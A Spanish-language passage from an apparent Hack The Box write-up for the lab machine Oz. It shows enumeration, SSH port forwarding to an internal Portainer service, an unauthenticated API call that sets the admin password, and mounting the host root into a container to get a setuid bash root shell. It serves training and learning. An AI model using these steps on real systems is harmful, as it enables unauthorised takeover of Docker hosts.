<p>Procedemos a hacer una enumeracion del sistema como siempre:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dorthi@Oz:/admin<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
Matching Defaults entries <span class="k">for </span>dorthi on Oz:
    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin

User dorthi may run the following commands on Oz:
   <span class="s2">" (ALL) NOPASSWD: /usr/bin/docker network inspect *"</span>
   <span class="s2">" (ALL) NOPASSWD: /usr/bin/docker network ls"</span>



dorthi@Oz:/admin<span class="nv">$ </span><span class="nb">sudo </span>docker network inspect bridge
<span class="o">[</span>
    <span class="o">{</span>
        <span class="s2">"Name"</span>: <span class="s2">"bridge"</span>,
        <span class="s2">"Id"</span>: <span class="s2">"a6b4f157c9e52f695bffde0984a763b23f382dc0dd4318683c4f920ac374d9ab"</span>,
        <span class="s2">"Created"</span>: <span class="s2">"2021-06-20T04:52:02.80355347-05:00"</span>,
        <span class="s2">"Scope"</span>: <span class="s2">"local"</span>,
        <span class="s2">"Driver"</span>: <span class="s2">"bridge"</span>,
        <span class="s2">"EnableIPv6"</span>: <span class="nb">false</span>,
        <span class="s2">"IPAM"</span>: <span class="o">{</span>
            <span class="s2">"Driver"</span>: <span class="s2">"default"</span>,
            <span class="s2">"Options"</span>: null,
            <span class="s2">"Config"</span>: <span class="o">[</span>
                <span class="o">{</span>
                    <span class="s2">"Subnet"</span>: <span class="s2">"172.17.0.0/16"</span>,
                    <span class="s2">"Gateway"</span>: <span class="s2">"172.17.0.1"</span>
                <span class="o">}</span>
            <span class="o">]</span>
        <span class="o">}</span>,
        <span class="s2">"Internal"</span>: <span class="nb">false</span>,
        <span class="s2">"Attachable"</span>: <span class="nb">false</span>,
        <span class="s2">"Containers"</span>: <span class="o">{</span>
            <span class="s2">"e267fc4f305575070b1166baf802877cb9d7c7c5d7711d14bfc2604993b77e14"</span>: <span class="o">{</span>
                <span class="s2">"Name"</span>: <span class="s2">"portainer-1.11.1"</span>,
                <span class="s2">"EndpointID"</span>: <span class="s2">"55041e840fae215bf26fe1cfb2c249adf2e00692cdb37103bbfcaf8469a1993c"</span>,
                <span class="s2">"MacAddress"</span>: <span class="s2">"02:42:ac:11:00:02"</span>,
                <span class="s2">"IPv4Address"</span>: <span class="s2">"172.17.0.2/16"</span>,
                <span class="s2">"IPv6Address"</span>: <span class="s2">""</span>
            <span class="o">}</span>
        <span class="o">}</span>,
        <span class="s2">"Options"</span>: <span class="o">{</span>
            <span class="s2">"com.docker.network.bridge.default_bridge"</span>: <span class="s2">"true"</span>,
            <span class="s2">"com.docker.network.bridge.enable_icc"</span>: <span class="s2">"true"</span>,
            <span class="s2">"com.docker.network.bridge.enable_ip_masquerade"</span>: <span class="s2">"true"</span>,
            <span class="s2">"com.docker.network.bridge.host_binding_ipv4"</span>: <span class="s2">"0.0.0.0"</span>,
            <span class="s2">"com.docker.network.bridge.name"</span>: <span class="s2">"docker0"</span>,
            <span class="s2">"com.docker.network.driver.mtu"</span>: <span class="s2">"1500"</span>
        <span class="o">}</span>,
        <span class="s2">"Labels"</span>: <span class="o">{}</span>
    <span class="o">}</span>

dorthi@Oz:/admin<span class="nv">$ </span>nmap <span class="nt">-p-</span> <span class="nt">--open</span> <span class="nt">-T5</span> <span class="nt">-v</span> <span class="nt">-n</span> 172.17.0.2

Starting Nmap 7.01 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-06-20 08:49 CDT
Initiating Ping Scan at 08:49
Scanning 172.17.0.2 <span class="o">[</span>2 ports]
Completed Ping Scan at 08:49, 0.00s elapsed <span class="o">(</span>1 total hosts<span class="o">)</span>
Initiating Connect Scan at 08:49
Scanning 172.17.0.2 <span class="o">[</span>65535 ports]
Discovered open port 9000/tcp on 172.17.0.2
Completed Connect Scan at 08:49, 1.49s elapsed <span class="o">(</span>65535 total ports<span class="o">)</span>
Nmap scan report <span class="k">for </span>172.17.0.2
Host is up <span class="o">(</span>0.00010s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 65534 closed ports
PORT     STATE SERVICE
9000/tcp open  cslistener
</code></pre></div></div>
<p>Procedemos a hacer un Local Port Forwarding al conectarnos a la maquina del puerto 9000 para verlo en nuestro localhost:9000:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># for port in 40809 50212 46969; do nmap -sU -Pn --max-retries 0 -p$port 10.10.10.96; done &amp;&gt; /dev/null; ssh -i id_rsa dorthi@10.10.10.96 -L 9000:172.17.0.2:9000                                       255 ‚®Ø 1 ‚öô</span>
Enter passphrase <span class="k">for </span>key <span class="s1">'id_rsa'</span>: 
dorthi@Oz:~<span class="err">$</span>
</code></pre></div></div>
<p>Comprobamos que se ha hecho correctamente</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># lsof -i:9000                                                                                                   </span>
COMMAND   PID USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
ssh     14080 root    4u  IPv6 107500      0t0  TCP localhost:9000 <span class="o">(</span>LISTEN<span class="o">)</span>
ssh     14080 root    5u  IPv4 107501      0t0  TCP localhost:9000 <span class="o">(</span>LISTEN<span class="o">)</span>
</code></pre></div></div>
<p>Y ahora por aqui ya estariamos viendo el servicio de PORTAINER en nuestro 127.0.0.1:9000</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># curl -s -X POST "http://127.0.0.1:9000/api/users/admin/init" --data  'Username=Topro&amp;Password=pro'  </span>
<span class="o">{</span><span class="s2">"err"</span>:<span class="s2">"Invalid JSON"</span><span class="o">}</span>
</code></pre></div></div>
<h1 id="portainer-docker-app-administration">Portainer Docker App Administration</h1>
<p>Buscamos credenciales por defecto y encontramos una forma de setear o resetear la contrase√±a del admin si no ha sido previamente cambiada.Probamos:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># curl -s -X POST "http://127.0.0.1:9000/api/users/admin/init" --data  '{"Username": "admin", "Password": "pro"}'</span>
</code></pre></div></div>
<p>Entramos a la aplicacion Portainer y vemos que podemos crear un contenedor asique seguimos con el concepto de montar la / raiz de la maquina en un contenedor alojado como una montura para poder cambiar los archivos de la maquina y que se retoquen en la misma maquina</p>

<p>Para ello nos vamos a containers
creamos uno nuevo, le decimos que use la misma imagen que la que aparece en otro contenedor <code class="language-plaintext highlighter-rouge">ya cargado</code>.
Procedemos a crear la montura de la <code class="language-plaintext highlighter-rouge">/</code> en nuestro contenedor de nombre <code class="language-plaintext highlighter-rouge">SeTenso</code> <code class="language-plaintext highlighter-rouge">/mnt/root/</code>.
le damos a crear. Lo bueno del <code class="language-plaintext highlighter-rouge">Portrainer</code> es que en nuestro contenedor podemos lanzar una shell interactiva en <code class="language-plaintext highlighter-rouge">/bin/sh/</code> para poder acceder a la montura creada en el contenedor y visualizar todo el sistema <code class="language-plaintext highlighter-rouge">10.10.10.96</code> desde la <code class="language-plaintext highlighter-rouge">/</code>. Ya que tenemos una shell por ssh vamos a darle permisos SUID a la bash para poder conectarnos como root haciendo un <code class="language-plaintext highlighter-rouge">bash -p</code>. <code class="language-plaintext highlighter-rouge">chmod u+x /bin/bash</code></p>

<p>Cambiamos a la shell por ssh y obtenemos root</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dorthi@Oz:/bin<span class="nv">$ </span>bash <span class="nt">-p</span>
bash-4.3# <span class="nb">whoami
</span>root
bash-4.3# 
</code></pre></div></div>
<p>Y ya podriamos sacar la flag <code class="language-plaintext highlighter-rouge">root.txt</code>. Maquina Rooteada =D</p>

</div>


<div class="comments">
<div id="disqus_thread"></div>
<script>
 var disqus_config = function () {
     this.page.url = 'http://localhost:4000/2021/06/20/Oz~HackTheBox.html';
     this.page.identifier = '/2021/06/20/Oz~HackTheBox';
     this.page.title = 'Maquina  Retirada Oz de Hack The Box (Necesario VIP)';
 };

 (function() {  // REQUIRED CONFIGURATION VARIABLE: EDIT THE SHORTNAME BELOW
     var d = document, s = d.createElement('script');

     s.src = '//bitbrain-github-io.disqus.com/embed.js';

     s.setAttribute('data-timestamp', +new Date());
     (d.head || d.body).appendChild(s);
 })();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>

</div>




<div class="related">
  <h2>related posts</h2>
  <ul class="related-posts">
    
      <li>
        <h3>
          <a href="/2022/06/27/Trick.html">
            Maquina  Retirada Trick de Hack The Box (Necesario VIP)
          </a>
        </h3>
      </li>
    
      <li>
        <h3>
          <a href="/2022/06/15/Attacktive-Directory.html">
            Maquina Retirada Search de Hack The Box (Necesario VIP)
          </a>
        </h3>
      </li>
    
      <li>
        <h3>
          <a href="/2022/06/05/Search-AD.html">
            Maquina Retirada Search de Hack The Box (Necesario VIP)
          </a>
        </h3>
      </li>
    
  </ul>
</div>




  
  <h2>all tags</h2>
  <div class="tag-cloud"><a href="/tag/%26/" class="set-1">&</a> <a href="/tag/%2C/" class="set-1">,</a> <a href="/tag/1.8%2C/" class="set-1">1.8,</a> <a href="/tag/4.4%2C/" class="set-1">4.4,</a> <a href="/tag/8.6%2C/" class="set-1">8.6,</a> <a href="/tag/ad/" class="set-1">AD</a> <a href="/tag/adrotate%2C/" class="set-1">ADRotate,</a> <a href="/tag/aspreproast/" class="set-1">ASPREPRoast</a> <a href="/tag/asrep-roast%2C/" class="set-1">ASREP-Roast,</a> <a href="/tag/asreproast/" class="set-1">ASREPRoast</a> <a href="/tag/active/" class="set-1">Active</a> <a href="/tag/admin%2C/" class="set-1">Admin,</a> <a href="/tag/admins/" class="set-1">Admins</a> <a href="/tag/admins%2C/" class="set-1">Admins,</a> <a href="/tag/archivos/" class="set-1">Archivos</a> <a href="/tag/attack%2C/" class="set-1">Attack,</a> <a href="/tag/attacks/" class="set-1">Attacks</a> <a href="/tag/autopwn%2C/" class="set-1">AutoPwn,</a> <a href="/tag/azure/" class="set-1">Azure</a> <a href="/tag/bof%2C/" class="set-1">BOF,</a> <a href="/tag/bin/" class="set-1">Bin</a> <a href="/tag/blind%2C/" class="set-1">Blind,</a> <a href="/tag/bloodhound%2C/" class="set-1">BloodHound,</a> <a href="/tag/bruta%2C/" class="set-1">Bruta,</a> <a href="/tag/bruteforce%2C/" class="set-1">BruteForce,</a> <a href="/tag/bruteforce%2C/" class="set-1">Bruteforce,</a> <a href="/tag/burpsuite%2C/" class="set-1">Burpsuite,</a> <a href="/tag/bypass/" class="set-1">ByPass</a> <a href="/tag/bypass%2C/" class="set-1">Bypass,</a> <a href="/tag/ca/" class="set-1">CA</a> <a href="/tag/cgi-bin%2C/" class="set-1">CGI-BIN,</a> <a href="/tag/cron%2C/" class="set-1">CRON,</a> <a href="/tag/csrf/" class="set-1">CSRF</a> <a href="/tag/curl%2C/" class="set-1">CURL,</a> <a href="/tag/chkrootkit%2C/" class="set-1">Chkrootkit,</a> <a href="/tag/churrasco%2C/" class="set-1">Churrasco,</a> <a href="/tag/cifrado/" class="set-1">Cifrado</a> <a href="/tag/command/" class="set-1">Command</a> <a href="/tag/contracts%2C/" class="set-1">Contracts,</a> <a href="/tag/cracking/" class="set-1">Cracking</a> <a href="/tag/crackmapexec%2C/" class="set-1">Crackmapexec,</a> <a href="/tag/cron-taks%2C/" class="set-1">Cron-taks,</a> <a href="/tag/crontabs%2C/" class="set-1">CronTabs,</a> <a href="/tag/crypto%2C/" class="set-1">Crypto,</a> <a href="/tag/curlftp%2C/" class="set-1">CurlFtp,</a> <a href="/tag/decimal%2C/" class="set-1">Decimal,</a> <a href="/tag/device/" class="set-1">Device</a> <a href="/tag/directory%2C/" class="set-1">Directory,</a> <a href="/tag/dockers%2C/" class="set-1">Dockers,</a> <a href="/tag/domain/" class="set-1">Domain</a> <a href="/tag/dominios%2C/" class="set-1">Dominios,</a> <a href="/tag/dovecot%2C/" class="set-1">Dovecot,</a> <a href="/tag/elastix%2C/" class="set-1">Elastix,</a> <a href="/tag/empezando%2C/" class="set-1">Empezando,</a> <a href="/tag/encrypt-decrypt%2C/" class="set-1">Encrypt-Decrypt,</a> <a href="/tag/enumeracion%2C/" class="set-1">Enumeracion,</a> <a href="/tag/enumeration%2C/" class="set-1">Enumeration,</a> <a href="/tag/ethereum%2C/" class="set-1">Ethereum,</a> <a href="/tag/evil-winrm%2C/" class="set-1">Evil-WinRm,</a> <a href="/tag/excel%2C/" class="set-1">Excel,</a> <a href="/tag/excell/" class="set-1">Excell</a> <a href="/tag/execel/" class="set-1">Execel</a> <a href="/tag/exploit%2C/" class="set-1">Exploit,</a> <a href="/tag/fail2ban%2C/" class="set-1">Fail2ban,</a> <a href="/tag/file/" class="set-1">File</a> <a href="/tag/file%2C/" class="set-1">File,</a> <a href="/tag/files%2C/" class="set-1">Files,</a> <a href="/tag/firefox%2C/" class="set-1">Firefox,</a> <a href="/tag/ftp%2C/" class="set-1">Ftp,</a> <a href="/tag/fueza/" class="set-1">Fueza</a> <a href="/tag/fuzzing/" class="set-1">Fuzzing</a> <a href="/tag/fuzzing%2C/" class="set-1">Fuzzing,</a> <a href="/tag/get-adobject%2C/" class="set-1">Get-ADObject,</a> <a href="/tag/getchanges-all%2C/" class="set-1">GetChanges-All,</a> <a href="/tag/gitlab%2C/" class="set-1">GitLab,</a> <a href="/tag/gitbucket%2C/" class="set-1">Gitbucket,</a> <a href="/tag/gratuitas./" class="set-1">Gratuitas.</a> <a href="/tag/group%2C/" class="set-1">Group,</a> <a href="/tag/groups%2C/" class="set-1">Groups,</a> <a href="/tag/guessing%2C/" class="set-1">Guessing,</a> <a href="/tag/gwolle%2C/" class="set-1">Gwolle,</a> <a href="/tag/htb%2C/" class="set-5">HTB,</a> <a href="/tag/hackthebox%2C/" class="set-1">HackTheBox,</a> <a href="/tag/hacking/" class="set-3">Hacking</a> <a href="/tag/hacking%2C/" class="set-2">Hacking,</a> <a href="/tag/heartbleed%2C/" class="set-1">HeartBleed,</a> <a href="/tag/hex%2C/" class="set-1">Hex,</a> <a href="/tag/hijacking%2C/" class="set-1">Hijacking,</a> <a href="/tag/hydra%2C/" class="set-1">Hydra,</a> <a href="/tag/iis%2C/" class="set-1">IIS,</a> <a href="/tag/iis-6.0%2C/" class="set-1">IIS-6.0,</a> <a href="/tag/ipfs%2C/" class="set-1">IPFS,</a> <a href="/tag/ipv6%2C/" class="set-1">IPV6,</a> <a href="/tag/irc%2C/" class="set-1">IRC,</a> <a href="/tag/id-rsa%2C/" class="set-1">Id-Rsa,</a> <a href="/tag/impackect-secretsdump%2C/" class="set-1">Impackect-SecretsDump,</a> <a href="/tag/import/" class="set-1">Import</a> <a href="/tag/inclusion%2C/" class="set-1">Inclusion,</a> <a href="/tag/injection%29%2C/" class="set-1">Injection),</a> <a href="/tag/injection%2C/" class="set-1">Injection,</a> <a href="/tag/jjs%2C/" class="set-1">JJS,</a> <a href="/tag/jndi%2C/" class="set-1">JNDI,</a> <a href="/tag/joomla%2C/" class="set-1">Joomla,</a> <a href="/tag/journalctl%2C/" class="set-1">Journalctl,</a> <a href="/tag/juicypotato%2C/" class="set-1">JuicyPotato,</a> <a href="/tag/kerberoasting/" class="set-1">Kerberoasting</a> <a href="/tag/kerbrute/" class="set-1">Kerbrute</a> <a href="/tag/kerbrute%2C/" class="set-1">Kerbrute,</a> <a href="/tag/kernel/" class="set-1">Kernel</a> <a href="/tag/knocking%2C/" class="set-1">Knocking,</a> <a href="/tag/kubernetes%2C/" class="set-1">Kubernetes,</a> <a href="/tag/ldap/" class="set-1">LDAP</a> <a href="/tag/ldap%2C/" class="set-1">LDAP,</a> <a href="/tag/lfi%2C/" class="set-1">LFI,</a> <a href="/tag/local/" class="set-1">Local</a> <a href="/tag/log4j%2C/" class="set-1">Log4j,</a> <a href="/tag/mail%2C/" class="set-1">Mail,</a> <a href="/tag/malicius/" class="set-1">Malicius</a> <a href="/tag/maquina/" class="set-1">Maquina</a> <a href="/tag/maquinas/" class="set-5">Maquinas</a> <a href="/tag/mattermost%2C/" class="set-1">Mattermost,</a> <a href="/tag/mimikatz.exe%2C/" class="set-1">Mimikatz.exe,</a> <a href="/tag/misconfigurations%2C/" class="set-1">Misconfigurations,</a> <a href="/tag/mongo-db%2C/" class="set-1">Mongo-db,</a> <a href="/tag/mongodb%2C/" class="set-1">MongoDB,</a> <a href="/tag/mr.robot%2C/" class="set-1">Mr.Robot,</a> <a href="/tag/mssqlclient%2C/" class="set-1">Mssqlclient,</a> <a href="/tag/multiples/" class="set-1">Multiples</a> <a href="/tag/myssql-server%2C/" class="set-1">Myssql-Server,</a> <a href="/tag/neo4j%2C/" class="set-1">Neo4j,</a> <a href="/tag/nibbleblog%2C/" class="set-1">NibbleBlog,</a> <a href="/tag/nishang%2C/" class="set-1">Nishang,</a> <a href="/tag/nosqli%2C/" class="set-1">NoSQLI,</a> <a href="/tag/node-red%2C/" class="set-1">Node-Red,</a> <a href="/tag/nostromo/" class="set-1">Nostromo</a> <a href="/tag/os/" class="set-1">OS</a> <a href="/tag/oscp/" class="set-3">OSCP</a> <a href="/tag/osticket%2C/" class="set-1">OSTicket,</a> <a href="/tag/offensive/" class="set-1">Offensive</a> <a href="/tag/olevba/" class="set-1">Olevba</a> <a href="/tag/php%2C/" class="set-1">PHP,</a> <a href="/tag/php./" class="set-1">PHP.</a> <a href="/tag/password/" class="set-1">Password</a> <a href="/tag/path/" class="set-1">Path</a> <a href="/tag/path%2C/" class="set-3">Path,</a> <a href="/tag/pivoting%2C/" class="set-1">Pivoting,</a> <a href="/tag/plugins%2C/" class="set-1">Plugins,</a> <a href="/tag/pods%2Fcontainer./" class="set-1">Pods/Container.</a> <a href="/tag/popd%2C/" class="set-1">PopD,</a> <a href="/tag/port/" class="set-1">Port</a> <a href="/tag/portknocking%2C/" class="set-1">PortKnocking,</a> <a href="/tag/portainer%2C/" class="set-1">Portainer,</a> <a href="/tag/portal%2C/" class="set-1">Portal,</a> <a href="/tag/post-explotacion./" class="set-1">Post-Explotacion.</a> <a href="/tag/powershell/" class="set-1">PowerShell</a> <a href="/tag/powerup%2C/" class="set-1">PowerUp,</a> <a href="/tag/powershell%2C/" class="set-1">Powershell,</a> <a href="/tag/privesc/" class="set-1">Privesc</a> <a href="/tag/privesc%2C/" class="set-1">Privesc,</a> <a href="/tag/proteccions%2C/" class="set-1">Proteccions,</a> <a href="/tag/protection%2C/" class="set-1">Protection,</a> <a href="/tag/python%2C/" class="set-1">Python,</a> <a href="/tag/python3%2C/" class="set-1">Python3,</a> <a href="/tag/rce%2C/" class="set-1">RCE,</a> <a href="/tag/rdp-file%2C/" class="set-1">RDP-file,</a> <a href="/tag/rpcclient%2C/" class="set-1">RPCCLIENT,</a> <a href="/tag/read%2C/" class="set-1">Read,</a> <a href="/tag/readgmsapassword%2C/" class="set-1">ReadGMSAPassword,</a> <a href="/tag/recycle/" class="set-1">Recycle</a> <a href="/tag/remote/" class="set-1">Remote</a> <a href="/tag/retiradas/" class="set-1">Retiradas</a> <a href="/tag/retiradas%2C/" class="set-5">Retiradas,</a> <a href="/tag/retiradas./" class="set-1">Retiradas.</a> <a href="/tag/revome/" class="set-1">Revome</a> <a href="/tag/smb%2C/" class="set-1">SMB,</a> <a href="/tag/snmp%2C/" class="set-1">SNMP,</a> <a href="/tag/sqli/" class="set-1">SQLI</a> <a href="/tag/sqli%2C/" class="set-1">SQLI,</a> <a href="/tag/sqlinjecction%2C/" class="set-1">SQLInjecction,</a> <a href="/tag/ss%2C/" class="set-1">SS,</a> <a href="/tag/ssh%2C/" class="set-1">SSH,</a> <a href="/tag/ssrf/" class="set-1">SSRF</a> <a href="/tag/ssrf%2C/" class="set-1">SSRF,</a> <a href="/tag/ssti%28server/" class="set-1">SSTI(Server</a> <a href="/tag/suid%2C/" class="set-1">SUID,</a> <a href="/tag/sam%2C/" class="set-1">Sam,</a> <a href="/tag/samba%2C/" class="set-1">Samba,</a> <a href="/tag/scheduler%2C/" class="set-1">Scheduler,</a> <a href="/tag/script%2C/" class="set-1">Script,</a> <a href="/tag/secretsdump.py%2C/" class="set-1">SecretsDump.py,</a> <a href="/tag/secretsdumps.py%2C/" class="set-1">Secretsdumps.py,</a> <a href="/tag/security%2C/" class="set-1">Security,</a> <a href="/tag/shares/" class="set-1">Shares</a> <a href="/tag/sharphound.ps1%2C/" class="set-1">SharpHound.ps1,</a> <a href="/tag/shellshock%2C/" class="set-1">ShellShock,</a> <a href="/tag/side/" class="set-1">Side</a> <a href="/tag/smart/" class="set-1">Smart</a> <a href="/tag/smb%2C/" class="set-1">Smb,</a> <a href="/tag/smbclient%2C/" class="set-1">SmbClient,</a> <a href="/tag/smbmap%2C/" class="set-1">SmbMap,</a> <a href="/tag/sqsh%2C/" class="set-1">Sqsh,</a> <a href="/tag/starting/" class="set-1">Starting</a> <a href="/tag/steganografia%2C/" class="set-1">Steganografia,</a> <a href="/tag/subdomains%2C/" class="set-1">Subdomains,</a> <a href="/tag/sudo/" class="set-1">Sudo</a> <a href="/tag/system%2C/" class="set-1">System,</a> <a href="/tag/thm%2C/" class="set-1">THM,</a> <a href="/tag/template/" class="set-1">Template</a> <a href="/tag/tmux-priv%2C/" class="set-1">Tmux-Priv,</a> <a href="/tag/tomcat/" class="set-1">Tomcat</a> <a href="/tag/tomcat%2C/" class="set-1">Tomcat,</a> <a href="/tag/transfer%2C/" class="set-1">Transfer,</a> <a href="/tag/transferencia/" class="set-1">Transferencia</a> <a href="/tag/tryhackme%2C/" class="set-1">TryHackMe,</a> <a href="/tag/ubuntu/" class="set-1">Ubuntu</a> <a href="/tag/unrealirc%2C/" class="set-1">UnRealIRC,</a> <a href="/tag/upload/" class="set-1">Upload</a> <a href="/tag/userenum%2C/" class="set-1">Userenum,</a> <a href="/tag/vnc/" class="set-1">VNC</a> <a href="/tag/web/" class="set-2">Web</a> <a href="/tag/web3%2C/" class="set-1">Web3,</a> <a href="/tag/webshell%2C/" class="set-1">Webshell,</a> <a href="/tag/wget/" class="set-1">Wget</a> <a href="/tag/winpeas%2C/" class="set-1">WinPeas,</a> <a href="/tag/windows/" class="set-1">Windows</a> <a href="/tag/windows%2C/" class="set-1">Windows,</a> <a href="/tag/wordpress%2C/" class="set-1">Wordpress,</a> <a href="/tag/wpscan%2C/" class="set-1">Wpscan,</a> <a href="/tag/writeup/" class="set-2">Writeup</a> <a href="/tag/writeup%2C/" class="set-3">Writeup,</a> <a href="/tag/x-forwarder-for%2C/" class="set-1">X-Forwarder-For,</a> <a href="/tag/xp_cmdshell%2C/" class="set-1">Xp_CmdShell,</a> <a href="/tag/xp_dirtree%2C/" class="set-1">Xp_dirtree,</a> <a href="/tag/ysoserial%2C/" class="set-1">Ysoserial,</a> <a href="/tag/zona%2C/" class="set-1">Zona,</a> <a href="/tag/zone/" class="set-1">Zone</a> <a href="/tag/app-js%2C/" class="set-1">app-js,</a> <a href="/tag/bashscript%2C/" class="set-1">bashscript,</a> <a href="/tag/chisel%2C/" class="set-1">chisel,</a> <a href="/tag/de/" class="set-1">de</a> <a href="/tag/dompdf%2C/" class="set-1">dompdf,</a> <a href="/tag/ecppt%2C/" class="set-1">eCPPT,</a> <a href="/tag/fcrackzip%2C/" class="set-1">fcrackzip,</a> <a href="/tag/html/" class="set-1">html</a> <a href="/tag/injecction/" class="set-1">injecction</a> <a href="/tag/msfvenom%2C/" class="set-1">msfvenom,</a> <a href="/tag/nmap%2C/" class="set-1">nmap,</a> <a href="/tag/pfsense%2C/" class="set-1">pfSense,</a> <a href="/tag/pfx2john%2C/" class="set-1">pfx2john,</a> <a href="/tag/phpliteadmin%2C/" class="set-1">phpLiteAdmin,</a> <a href="/tag/privesc/" class="set-1">privesc</a> <a href="/tag/privesc%2C/" class="set-1">privesc,</a> <a href="/tag/python%2C/" class="set-1">python,</a> <a href="/tag/redis-cli%2C/" class="set-1">redis-cli,</a> <a href="/tag/rsync%2C/" class="set-1">rsync,</a> <a href="/tag/smtpd%2C/" class="set-1">smtpd,</a> <a href="/tag/socat%2C/" class="set-1">socat,</a> <a href="/tag/squidproxy%2C/" class="set-1">squidproxy,</a> <a href="/tag/steghide%2C/" class="set-1">steghide,</a> <a href="/tag/tar%2C/" class="set-1">tar,</a> <a href="/tag/webdav%2C/" class="set-1">webdav,</a> <a href="/tag/welcome/" class="set-1">welcome</a> <a href="/tag/xss/" class="set-1">xss</a></div>
  




<script>
  let i = 0;
  const text = 'En esta ocasion empezaremos con el Writeup de la maquina de HackTheBox llamada OZ';
  const speed = parseInt('50');
  
  function typeWriter() {
    if (i < text.length) {
      document.getElementById('animated-post-description').innerHTML += text.charAt(i);
      i++;
      setTimeout(typeWriter, speed);
    }
  }

  document.getElementById('animated-post-description').style.display = 'initial';
  typeWriter();
</script>

      </div>
    </main><footer class="site-footer">
  <div class="wrapper">
    <div class="credits"><a href="https://github.com/bitbrain/jekyll-dash">dash</a> theme for Jekyll by <a href="https://github.com/bitbrain">bitbrain</a> made with <i class="fas fa-heart"></i><div class="toggleWrapper">
    <input type="checkbox" class="dn" id="theme-toggle" onclick="modeSwitcher()" checked />
    <label for="theme-toggle" class="toggle">
    <span class="toggle__handler">
      <span class="crater crater--1"></span>
      <span class="crater crater--2"></span>
      <span class="crater crater--3"></span>
    </span>
        <span class="star star--1"></span>
        <span class="star star--2"></span>
        <span class="star star--3"></span>
        <span class="star star--4"></span>
        <span class="star star--5"></span>
        <span class="star star--6"></span>
    </label>
</div>
<script type="text/javascript">
const theme = localStorage.getItem('theme');

if (theme === "light") {
    document.documentElement.setAttribute('data-theme', 'light');
} else {
    document.documentElement.setAttribute('data-theme', 'dark');
}
const userPrefers = getComputedStyle(document.documentElement).getPropertyValue('content');

function activateDarkTheme() {
    document.getElementById('theme-toggle').checked = true;
    document.documentElement.setAttribute('data-theme', 'dark');
    document.documentElement.classList.add('theme--dark');
    document.documentElement.classList.remove('theme--light');
	document.getElementById("theme-toggle").className = 'light';
	window.localStorage.setItem('theme', 'dark');
}

function activateLightTheme() {
    document.getElementById('theme-toggle').checked = false;
    document.documentElement.setAttribute('data-theme', 'light');
    document.documentElement.classList.add('theme--light');
    document.documentElement.classList.remove('theme--dark');
	document.getElementById("theme-toggle").className = 'dark';
	window.localStorage.setItem('theme', 'light');
}

if (theme === "dark") {
    activateDarkTheme();
} else if (theme === "light") {
    activateLightTheme();
} else if  (userPrefers === "light") {
    activateDarkTheme();
} else {
    activateDarkTheme();
}

function modeSwitcher() {
	let currentMode = document.documentElement.getAttribute('data-theme');
	if (currentMode === "dark") {
	    activateLightTheme();
	} else {
	    activateDarkTheme();
	}
}
</script></div>
  </div>
</footer>


<script>
      window.FontAwesomeConfig = {
        searchPseudoElements: true
      }
    </script>
  </body>

</html>
